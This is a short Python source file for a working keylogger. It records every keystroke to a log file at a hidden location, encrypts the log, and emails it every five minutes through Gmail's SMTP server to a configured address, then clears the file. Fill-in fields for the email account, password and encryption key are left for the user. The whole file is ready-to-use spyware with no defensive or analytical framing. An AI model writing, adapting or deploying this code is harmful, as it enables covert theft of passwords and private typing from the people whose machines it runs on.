from pynput import keyboard
from cryptography.fernet import Fernet
import smtplib
from email.message import EmailMessage
import threading
import os

# === CONFIGURATION ===
#location of the hidden file of 
log_file = ""  # Hidden location
email_interval = 300  # Send email every 5 minutes (in seconds)
#your mail id
EMAIL_ADDRESS = ""
#setup any two factor auth password
EMAIL_PASSWORD = ""

# === ENCRYPTION SETUP ===
key = b''  # Replace with your actual key
cipher = Fernet(key)

# === LOGGING FUNCTION ===
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key.name}]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

# === EMAIL FUNCTION ===
def send_email():
    try:
        if os.path.exists(log_file):
            with open(log_file, "r") as f:
                data = f.read()

            if data.strip():  # Don't send empty logs
                encrypted_data = cipher.encrypt(data.encode())

                msg = EmailMessage()
                msg["Subject"] = "Encrypted Keystroke Logs"
                msg["From"] = EMAIL_ADDRESS
                msg["To"] = EMAIL_ADDRESS
                msg.set_content(encrypted_data.decode())

                with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
                    smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                    smtp.send_message(msg)

                with open(log_file, "w") as f:
                    f.write("")  # Clear log

    except Exception as e:
        print(f"Email error: {e}")

    threading.Timer(email_interval, send_email).start()

# === START ===
# Make folder if it doesn't exist
os.makedirs(os.path.dirname(log_file), exist_ok=True)

send_email()
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
